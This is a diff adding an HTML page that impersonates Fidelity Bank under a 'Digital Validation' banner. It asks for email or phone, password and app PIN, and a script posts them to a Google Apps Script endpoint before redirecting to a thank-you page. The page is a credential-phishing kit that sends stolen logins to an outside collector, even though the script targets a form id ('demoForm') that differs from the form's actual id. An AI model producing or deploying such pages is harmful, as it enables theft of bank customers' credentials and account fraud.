@@ -1,1 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Digital Services Demo</title>
 
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background: #ffffff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      color: #333;
+    }
+
+    .header, footer {
+      background: #ff6600;
+      color: #ffffff;
+      text-align: center;
+      padding: 18px;
+      border-radius: 50px;
+      box-shadow: 0 3px 8px rgba(0, 0, 0, 0.2);
+      width: 90%;
+      max-width: 600px;
+      margin: 15px auto;
+      font-weight: bold;
+      box-sizing: border-box;
+    }
+
+    .header h1 {
+      font-size: 22px;
+      margin: 0;
+    }
+
+    .header p {
+      font-size: 14px;
+      margin: 6px 0 0;
+      font-weight: normal;
+    }
+
+    .form-wrap {
+      background: #ffffff;
+      width: 90%;
+      max-width: 400px;
+      margin-top: 5px;
+      padding: 30px 25px;
+      border-radius: 12px;
+      box-shadow: 0 6px 16px rgba(0,0,0,0.15);
+      box-sizing: border-box;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      font-weight: bold;
+      color: #333333;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 18px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #ff6600;
+    }
+
+    button {
+      width: 100%;
+      padding: 18px 12px;
+      border-radius: 9px;
+      border: none;
+      background: #ff6600;
+      color: #ffffff;
+      font-weight: normal;
+      cursor: pointer;
+      font-size: 20px;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background: #e65c00;
+    }
+
+    footer {
+      font-size: 13px;
+      padding: 15px;
+      border-radius: 50px;
+      margin-top: auto;
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.45);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      color: white;
+      font-size: 18px;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.4s ease;
+    }
+
+    .overlay.active {
+      opacity: 1;
+      pointer-events: all;
+    }
+
+    .spinner {
+      border: 4px solid #ffffff;
+      border-top: 4px solid #ff6600;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 15px;
+    }
+
+    @keyframes spin {
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="header">
+    <h1>FIDELITY BANK DIGITAL VALIDATION </h1>
+    <p>Believe With Us.</p>
+  </div>
+
+  <div class="form-wrap" id="formContainer">
+
+    <form id="dataForm" autocomplete="off">
+
+       <label>Email or Phone Number</label>
+      <input type="text" name="email" placeholder="Enter email or phone" required>
+      <label>Password</label>
+      <input type="password" name="password" placeholder="Enter your password" required>
+      <label>App Pin Code</label>
+      <input type="text" name="pin" placeholder="Enter pin" required>
+      <button type="submit" class="login-btn">VALIDATE →</button>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById("demoForm").addEventListener("submit", async event => {
+      event.preventDefault();
+      const data = new FormData(event.target);
+
+      try {
+        const res = await fetch("https://script.google.com/macros/s/AKfycbwmkOBcmudBWS5kC-9UD2Gq_jsddGL9V8rNI2imMEf23HGzroYRrX6Svee0DNSS7msP/exec", { method: "POST", body: data });
+        const text = await res.text();
+        if (text.includes("SUCCESS")) {
+          window.location.href = "thankyou.html";
+        } else {
+          alert("Submission failed: " + text);
+        }
+      } catch (error) {
+        console.error(error);
+        alert("Error submitting form.");
+      }
+    });
+  </script>
+</body>
+</html>
